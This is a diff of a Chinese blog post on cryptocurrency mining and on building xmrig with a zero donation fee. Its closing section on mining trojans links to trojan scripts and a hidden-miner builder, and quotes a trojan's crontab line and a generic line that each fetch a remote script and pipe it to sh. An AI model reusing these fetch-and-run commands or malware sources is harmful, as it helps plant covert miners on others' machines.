@@ -11,11 +11,9 @@ title: 比特币及其挖矿配置
 
 比特币就像黄金，总量是固定的（**2100万个，到目前为止已经挖了1600多万个了，说是要挖到2140年，我也不知道咋算的**），我一个小老百姓，没有钱去倒卖黄金赚差价，只能自己拎锄头去挖矿了。
 
-
 比特币基本算法，比特币每10分钟产生1个区块(block)，每个区块里有N个比特币作为报酬(N的数量在下文中说明)，这个区块包含了最近10分钟所有的比特币交易信息。
 
 那么N是多少呢？根据比特币算法，在比特币发布之日起的头4年里，N = 基础报酬(50个比特币) + 交易报酬(过去10分钟内整个比特币网络耗费的交易手续费，前面已经说过，每笔比特币交易会消耗0.001比特币作为报酬给挖矿的人)，每隔4年，N的基础奖励将减少一半，也就是说，头4年为50，第5-8年为25，第9-12年为12.5，以此类推。而随着比特币越来越普及，交易越来越频繁，N的交易奖励会逐渐增加。
-
 
 ### 比特币白皮书
 
@@ -47,7 +45,7 @@ Binance Coin 由 Binance 交易所于 2017 年创建和发行，即使在其存�
 
 ## 教程
 
-使用教程： https://zhuanlan.zhihu.com/p/114300968
+使用教程： <https://zhuanlan.zhihu.com/p/114300968>
 
 矿机：最好理解吧，买来挖矿用的，现在比特币的话，蚂蚁矿机做的最大了
 
@@ -59,10 +57,10 @@ Binance Coin 由 Binance 交易所于 2017 年创建和发行，即使在其存�
 
 算力：简单说就是你的矿机运算速度的一个量化指标，比如1T算力，就是1s能算10的12次方次运算。如果这10的12次方次能算出符合条件的结果那就挖到了，如果没有，可以说是白算了
 
-算力的单位： 
+算力的单位：
 1kH/S: 每秒1000次hash算法 - one thousand
 1MH/s：每秒100万次hash算法（1,000,000）- one million
-1GH/s: 每秒10亿次hash算法（1,000,000,000 ） - one billion 
+1GH/s: 每秒10亿次hash算法（1,000,000,000 ） - one billion
 1TH/s: 每秒1兆次hash算法(1,000,000,000,000) - one trillion
 1PH/s: 每秒1000京次hash算法（1,000,000,000,000,000） - one quadrillion
 1EH/s: 每秒100垓次hash算法(1,000,000,000,000,000,000) - one quintillion
@@ -73,15 +71,14 @@ Binance Coin 由 Binance 交易所于 2017 年创建和发行，即使在其存�
 
 钱包主要分为：“冷”钱包、“热”钱包、软件钱包、纸钱包。“冷”钱包是完全离线状态；“热”钱包必须联网使用；软件钱包是基于本地的，但可以连接到互联网；至于纸钱包，可以是一张打印出来的纸，也可以是本地网络里的一个文件。实际上，每个钱包都有自己的优势和弊端。通常安全性与易用性之间存在一个杠杆，非常安全的钱包，用起来反而不方便，而极其易用的钱包，往往会有安全性方面的担忧。我曾体验过的几十种不同的钱包，本文里我会重点介绍几个比较好用的钱包给大家。选择钱包之前，你要确认自己对钱包的需求点。通常作为重点考虑因素的是：安全性、易用性、是否收费、设计风格、附加功能。
 
-官网： https://bitcoin.org/zh_CN/choose-your-wallet
+官网： <https://bitcoin.org/zh_CN/choose-your-wallet>
 
-Windows环境： https://bitcoin.org/zh_CN/choose-your-wallet?step=5&platform=windows
+Windows环境： <https://bitcoin.org/zh_CN/choose-your-wallet?step=5&platform=windows>
 
 bitcoin core使用方法：
 
 1. 从上面的链接下载对应的Windows平台的安装包；
 2. 安装完成后设置对应的数据保存目录，然后启动程序会自动下载所有的数据；
-
 
 ## 矿机
 
@@ -95,85 +92,76 @@ bitcoin core使用方法：
 自己有电资源就不用考虑了，如果需要找托管矿场（今年电价在0.27-0.4之间）的话，需要亲自考察电的属性 电价 稳定性 运维 停电的处理方式 维修等，提醒下这里水很深。
 基本就这样，细节的东西也有，但是都不难。参与挖矿的核心不在于你懂不懂技术，也不是你有多大资本，而是电费。
 
-
 ## 交易网站
 
 交易所：Binance，Huobi等
 
 ## 矿池
 
-矿池排名： https://btc.com/
+矿池排名： <https://btc.com/>
 
 选择好矿场后，此时我们需要选择矿池。这里需要解释下为什么要选择矿池后再挖矿。在区块链早期，由于挖矿人数少，单台电脑每天也能获得收益。而随着全网算力不断上涨。独立挖矿的方式很快变得无利可图。于是在bitcointalk论坛上的Geek开发出一种将矿工联合起来，集中资源和按比例分享利润的系统，使用这种系统建立的网站被称为矿池。所以，为了追求利益的最大化，在目前的状况下，我们应该选择加入矿池。
 
-矿池的选择根据自己的喜好，目前矿工选择较多的矿池为：币印，鱼池，蚂蚁矿池，http://btc.com。
+矿池的选择根据自己的喜好，目前矿工选择较多的矿池为：币印，鱼池，蚂蚁矿池，<http://btc.com>。
 
 网上说矿池是很多个单独的矿工组合在一起挖矿，以提高算力更快的挖矿。因为越往后，越来越难挖。难挖是真的难挖，但是我个人觉得，矿池的意义在于，它是一个路径，一个让你去挖矿的路径。还是拿黄金举例子，你现在钱包有了，你说你要去挖黄金了，去哪儿挖？诶，找个矿池，矿池会告诉你去哪儿挖
 
-到这里，我要去找矿池，于是乎各大矿池出现了，什么鱼池，猫池，蚂蚁矿池等等等等，我就选了个鱼池，鱼池： https://www.f2pool.com/
-
-
+到这里，我要去找矿池，于是乎各大矿池出现了，什么鱼池，猫池，蚂蚁矿池等等等等，我就选了个鱼池，鱼池： <https://www.f2pool.com/>
 
 ## 挖矿软件
 
-参考列表: http://www.wabi.com/soft?cate=all
+参考列表: <http://www.wabi.com/soft?cate=all>
 
 软件名称 | 下载地址 | 支持币种 | 操作系统 | 费率  | 是否支持CPU,GPU
 ---------|----------|---------|---------|---------|---------
- **bminer**  | https://www.bminer.me/ | 比特币，笑脸币，以太币 | Window, **Linux**| 1%到2%费率不等 | AMD GPU深度优化
- **cgminer**   | https://github.com/ckolivas/cgminer | 比特币 | Linux | 开源免费
+ **bminer**  | <https://www.bminer.me/> | 比特币，笑脸币，以太币 | Window, **Linux**| 1%到2%费率不等 | AMD GPU深度优化
+ **cgminer**   | <https://github.com/ckolivas/cgminer> | 比特币 | Linux | 开源免费
  **guiminer** | 已挂 | 已挂 | 已挂 | 已挂
- **cpuminer** | https://github.com/pooler/cpuminer | 莱特币，比特币 | Windows, Linux | 开源免费
- **xmrig**   | https://github.com/xmrig/xmrig | 门罗币 | Windows, Linux | 1%费率不等
- **xmr-Stak** | https://github.com/fireice-uk/xmr-stak | 门罗币 | 2%费率
- **minergate** | https://minergate.com/ | 门罗币 | Windows, Linux | 收取一定费用
- **Ethminer**  | https://github.com/ethereum-mining/ethminer | 以太币，以太经典币 |Windows,Linux | 开源免费
+ **cpuminer** | <https://github.com/pooler/cpuminer> | 莱特币，比特币 | Windows, Linux | 开源免费
+ **xmrig**   | <https://github.com/xmrig/xmrig> | 门罗币 | Windows, Linux | 1%费率不等
+ **xmr-Stak** | <https://github.com/fireice-uk/xmr-stak> | 门罗币 | 2%费率
+ **minergate** | <https://minergate.com/> | 门罗币 | Windows, Linux | 收取一定费用
+ **Ethminer**  | <https://github.com/ethereum-mining/ethminer> | 以太币，以太经典币 |Windows,Linux | 开源免费
  **claymore** |停止更新 |claymore 以太币，以太经典币 |Windows,Linux | 收取2%费率
- **开源矿工NtMiner** | https://github.com/ntminer/NtMiner| 以太币，门罗币，笑脸币| Windows |开源免费
- **哈鱼矿工** | 前360团队 http://hashfish.net/ |以太币，门罗币 | Windows,Linux | 0抽水
- **轻松矿工** | http://www.qskg.top/ | 以太币 | Windows |
- **KKOS挖矿软件** | http://www.kkminer.com/#/ | 以太币，门罗币 | Windows, Linux | 定制返水
+ **开源矿工NtMiner** | <https://github.com/ntminer/NtMiner>| 以太币，门罗币，笑脸币| Windows |开源免费
+ **哈鱼矿工** | 前360团队 <http://hashfish.net/> |以太币，门罗币 | Windows,Linux | 0抽水
+ **轻松矿工** | <http://www.qskg.top/> | 以太币 | Windows |
+ **KKOS挖矿软件** | <http://www.kkminer.com/#/> | 以太币，门罗币 | Windows, Linux | 定制返水
 
-
- ## 挖矿软件内核
+## 挖矿软件内核
 
 币种 |算法| 类型|挖矿内核 | 矿池
 ---------|----------|---------|---------|---------
-  **BTC比特币**|SHA256 |**ASIC挖矿** | cgminer | 
+  **BTC比特币**|SHA256 |**ASIC挖矿** | cgminer |
  **ETH/ETC 以太币** | ethhash| **显卡GPU挖矿** | Claymore 15.0,NBMiner 31.1, PhoenixMiner 5.0e, Teamredminer 0.7.3, GMiner   |
  **XMR门罗币** | CryptoNight，RandomX | **RandomX针对CPU优化，不支持GPU** | xmrigCpu 5.11.1, RagerX.lol, XMR-Stak-RX |
  **LTC莱特币** | Scrypt | 暂无 | 暂无
 
-
- ## 推荐挖矿软件
+## 推荐挖矿软件
 
  1. 傻瓜式工具类，首推哈鱼矿工，其次开源矿工（以太币，门罗币）；
  2. 直接内核版，以太币因为是GPU显卡比较合适，推荐[Claymore](https://bitcointalk.org/index.php?topic=1433925.0)，也可以看看[minerOS矿工管家](www.mineros.cn)和[Bminer](https://www.bminer.me/releases/)，门罗币推荐xmrig和RagerX.lol。
 
-
- ## 推荐一键挖矿脚本
+## 推荐一键挖矿脚本
 
  1. Windows平台推荐使用~~哈鱼矿工(计费太少)~~和开源矿工，零费率。
  2. Linux平台推荐：
-   
-   - 门罗币： https://github.com/dovela/xmr-stak-auto/blob/master/OneClickMine.sh，注意要重新设置对应的费率问题
-   - 门罗币：xmrig, https://zgao.top/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/
 
+- 门罗币： <https://github.com/dovela/xmr-stak-auto/blob/master/OneClickMine.sh>，注意要重新设置对应的费率问题
+- 门罗币：xmrig, <https://zgao.top/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/>
 
  所以推荐在打开Windows的时候就用哈鱼矿工挂着，它实际挖的是门罗币；
- 然后在linux环境的时候参考https://blog.f2pool.com/zh/mining-tutorial/xmr，使用的是原版矿机：xmrig.
+ 然后在linux环境的时候参考<https://blog.f2pool.com/zh/mining-tutorial/xmr，使用的是原版矿机：xmrig>.
 
 ## Windows编译安装脚本xmrig零抽水
-
-
 
 > 2020/07: 推荐使用VS 2019编译，不推荐使用使用**MSYS2**
 > 2020/05： MSVC2015/MSVC2017 and MSYS 32 bit now deprecated and will no longer updated. 以后只支持Windows的64版本，而且只能使用`MSVC2019/MSYS2 64bit`进行编译。
 
 参考两个官方文档：
-1. Windows脚本（推荐）： https://github.com/xmrig/xmrig/wiki/Windows-Build
-2. Windows脚本依赖（可选）： https://github.com/xmrig/xmrig-deps
 
+1. Windows脚本（推荐）： <https://github.com/xmrig/xmrig/wiki/Windows-Build>
+2. Windows脚本依赖（可选）： <https://github.com/xmrig/xmrig-deps>
 
 采用MSYS2编译没有成功，所以此处尝试采用Visual Studio 2019 企业版进行编译。操作步骤如下：
 
@@ -189,7 +177,7 @@ bitcoin core使用方法：
 
 3. 点击右下角的“安装”按钮，等待十分钟左右完成所有的安装操作。
 
-4. 将xmrig官方仓库的代码克隆到本地：` git clone https://github.com/xmrig/xmrig.git`
+4. 将xmrig官方仓库的代码克隆到本地：`git clone https://github.com/xmrig/xmrig.git`
 
 > 注意此处你可以编辑文件`src/donate.h`,设置对应的捐赠抽水值为0
 
@@ -224,7 +212,7 @@ cmake .. -G "Visual Studio 16 2019" -A x64 -DXMRIG_DEPS=c:\xmrig-deps\msvc2019\x
 
 下载安装MSYS2（Minimal SYStem 2）。SYS2 是 MSYS 的一个升级版，准确的说是集成了 pacman 和 Mingw-w64 的 Cygwin 升级版，提供了bash shell 等 Linux 环境、版本控制软件（git/hg）和 MinGW-w64 工具链。与 MSYS 最大的区别是移植了 Arch Linux 的软件包管理系统 Pacman（其实是与Cygwin的区别）。
 
-Cygwin,MSYS2,MinGW-w64等的区别： https://www.zhihu.com/question/22137175
+Cygwin,MSYS2,MinGW-w64等的区别： <https://www.zhihu.com/question/22137175>
 
 编译脚本：
 
@@ -269,15 +257,14 @@ $ pacman -R <package_names|package_groups>
 
 ## linux编译安装脚本xmrig零抽水
 
-
-1. 参考编译xmrig免抽水： https://sunsea.im/ubuntu-debian-make-install-xmrig-config-hugepages.html
-2. 参考xmrig定制设置： https://www.cnblogs.com/heycomputer/articles/10235542.html
+1. 参考编译xmrig免抽水： <https://sunsea.im/ubuntu-debian-make-install-xmrig-config-hugepages.html>
+2. 参考xmrig定制设置： <https://www.cnblogs.com/heycomputer/articles/10235542.html>
 
 对应的所有操作安装命令如下：
 
 ```
 
-# Install xmrig depends	，官方源码编译帮助文档： https://xmrig.com/docs/miner/ubuntu-build
+# Install xmrig depends ，官方源码编译帮助文档： https://xmrig.com/docs/miner/ubuntu-build
 
 $ sudo apt install -y software-properties-common git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev libhwloc-dev gcc g++ 
 $ sudo apt install screen
@@ -321,15 +308,14 @@ $ nohup ./xmrig --cpu-max-threads-hint 100 >/dev/null 2>&1 &
 算力增强配置：
 
 ```
-$ wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
-$ sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
-$ wget http://developer.download.nvidia.com/compute/cuda/11.0.2/local_installers/cuda-repo-ubuntu2004-11-0-local_11.0.$ 2-450.51.05-1_amd64.deb
-$ sudo dpkg -i cuda-repo-ubuntu2004-11-0-local_11.0.2-450.51.05-1_amd64.deb
-$ sudo apt-key add /var/cuda-repo-ubuntu2004-11-0-local/7fa2af80.pub
-$ sudo apt-get update
-$ sudo apt-get -y install cuda
+wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
+sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
+wget http://developer.download.nvidia.com/compute/cuda/11.0.2/local_installers/cuda-repo-ubuntu2004-11-0-local_11.0.$ 2-450.51.05-1_amd64.deb
+sudo dpkg -i cuda-repo-ubuntu2004-11-0-local_11.0.2-450.51.05-1_amd64.deb
+sudo apt-key add /var/cuda-repo-ubuntu2004-11-0-local/7fa2af80.pub
+sudo apt-get update
+sudo apt-get -y install cuda
 ```
-
 
 成功运行截图，注意零抽水**donate: 0%**：
 ![20200711182612-2020-07-11](https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711182612-2020-07-11.png)
@@ -345,7 +331,6 @@ $ sudo apt-get -y install cuda
 成功运行截图，注意零抽水**donate: 0%**：
 
 ![20200711220304-2020-07-11](https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711220304-2020-07-11.png)
-
 
 ### ~~32位Raspian系统编译~~
 
@@ -416,15 +401,16 @@ make[1]: *** [CMakeFiles/Makefile2:74：CMakeFiles/xmrig.dir/all] 错误 2
 make: *** [Makefile:84：all] 错误 2
 
 ```
+
 上面的问题分析问题可能如下：
 
 1. 可能的cmake命令切换错误，[树莓派编译armv8l make error (using _x86 instead of _arm) 错误](https://github.com/xmrig/xmrig/issues/744)
 
 2. 查看树莓派对应的gcc/g++ 版本，命令: `gcc -v /g++ -v`, 确认不是gcc版本问题
-一个已经编译好的树莓派xmrig: https://github.com/auto-joe/rPi-xmrig-gcc7.3.0
-树莓派编译GCC7: https://solarianprogrammer.com/2017/12/07/raspberry-pi-raspbian-compiling-gcc/
+一个已经编译好的树莓派xmrig: <https://github.com/auto-joe/rPi-xmrig-gcc7.3.0>
+树莓派编译GCC7: <https://solarianprogrammer.com/2017/12/07/raspberry-pi-raspbian-compiling-gcc/>
 
-3. 可能是架构不支持，需要将树莓派切换成64位机器，参考问题说明： https://github.com/xmrig/xmrig/issues/1446
+3. 可能是架构不支持，需要将树莓派切换成64位机器，参考问题说明： <https://github.com/xmrig/xmrig/issues/1446>
 需要用到的脚本如下：
 
 ```
@@ -449,10 +435,10 @@ $ schroot -c pi64
 
 ## xmrig配置及其脚本
 
-1. 官方提供了一个有关该配置文件的在线配置： https://xmrig.com/wizard
-2. 学习文档: https://xmrig.com/docs, https://github.com/xmrig/xmrig/tree/master/doc
+1. 官方提供了一个有关该配置文件的在线配置： <https://xmrig.com/wizard>
+2. 学习文档: <https://xmrig.com/docs>, <https://github.com/xmrig/xmrig/tree/master/doc>
 
-其中重要的config.json文件内容(下载官方的默认配置文件: https://github.com/xmrig/xmrig/blob/master/src/config.json)，主要修改如下几个配置：
+其中重要的config.json文件内容(下载官方的默认配置文件: <https://github.com/xmrig/xmrig/blob/master/src/config.json>)，主要修改如下几个配置：
 
 - `cpu`部分的参数: `max-threads-hint` 控制占用的cpu内存大小，`priority`设置在空闲的时候进行运行。其中0 idle, 2 normal to 5 highest。
    添加一个配置`rx/0`,配置参数为: `[0,1,2,3]`
@@ -579,42 +565,39 @@ $ schroot -c pi64
 
 ## 挖矿木马
 
-1. 门罗币木马脚本： https://yq.aliyun.com/articles/637475
-2. 挖矿木马脚本： https://pastebin.com/X2EK5LXb
-3. 挖矿木马手机脚本: https://github.com/MinervaLabsResearch/BlogPosts/blob/master/MinerKiller/MinerKiller.sh
-4. 简易挖矿木马脚本： https://www.jianshu.com/p/30ca626c9e3a
-5. xrmig一键脚本： https://github.com/seanwhe/xmrig-bash-scripts , https://github.com/thequietman44/xmrig-scripts/
-
+1. 门罗币木马脚本： <https://yq.aliyun.com/articles/637475>
+2. 挖矿木马脚本： <https://pastebin.com/X2EK5LXb>
+3. 挖矿木马手机脚本: <https://github.com/MinervaLabsResearch/BlogPosts/blob/master/MinerKiller/MinerKiller.sh>
+4. 简易挖矿木马脚本： <https://www.jianshu.com/p/30ca626c9e3a>
+5. xrmig一键脚本： <https://github.com/seanwhe/xmrig-bash-scripts> , <https://github.com/thequietman44/xmrig-scripts/>
 
 发现木马反复执行一个定时任务`crontab -e`：
+
 ```
 # -q 静默模式， -O - 代表输出到对应的文件 /dev/null中，这个文件是一个空包
 * * * * * wget -q -O - http://195.3.146.118/sc.sh | sh > /dev/null 2>&1
 ```
-wget下载脚本，然后运行脚本自动删除脚本: `wget http://sitehere.com/install.sh -O - | sh`
 
+wget下载脚本，然后运行脚本自动删除脚本: `wget http://sitehere.com/install.sh -O - | sh`
 
 ### 木马脚本
 
-Windows平台木马： https://github.com/NYAN-x-CAT/Lime-Miner
+Windows平台木马： <https://github.com/NYAN-x-CAT/Lime-Miner>
 
-Windows强力病毒： https://github.com/hawksh/Hidden-miner-builder
+Windows强力病毒： <https://github.com/hawksh/Hidden-miner-builder>
 
-Windows挖矿提高脚本: https://github.com/DeadManWalkingTO/Windows10MiningTweaksDmW
-
+Windows挖矿提高脚本: <https://github.com/DeadManWalkingTO/Windows10MiningTweaksDmW>
 
 ### Github搜索病毒
 
 关键字: xmr mining shell, mining malware,Xmrig Miner Malware
 
-
-
 ### 病毒脚本
 
-1. 脚本参考： https://github.com/MoneroOcean/xmrig_setup
-2. 脚本搜索目录： https://github.com/search?l=Shell&p=2&q=.%2Fxmrig&type=Code
-3. 病毒清理脚本： https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool/blob/master/clear.sh
-4. xbash病毒脚本: https://www.freebuf.com/articles/terminal/185106.html, https://github.com/h3ct0rjs/XBash-malware-files
+1. 脚本参考： <https://github.com/MoneroOcean/xmrig_setup>
+2. 脚本搜索目录： <https://github.com/search?l=Shell&p=2&q=.%2Fxmrig&type=Code>
+3. 病毒清理脚本： <https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool/blob/master/clear.sh>
+4. xbash病毒脚本: <https://www.freebuf.com/articles/terminal/185106.html>, <https://github.com/h3ct0rjs/XBash-malware-files>
 
 ```shell
 # 以下是安装脚本，可以先编译好不用执行如下脚本
@@ -632,4 +615,3 @@ make -j$(nproc)
 
 
 ````
-
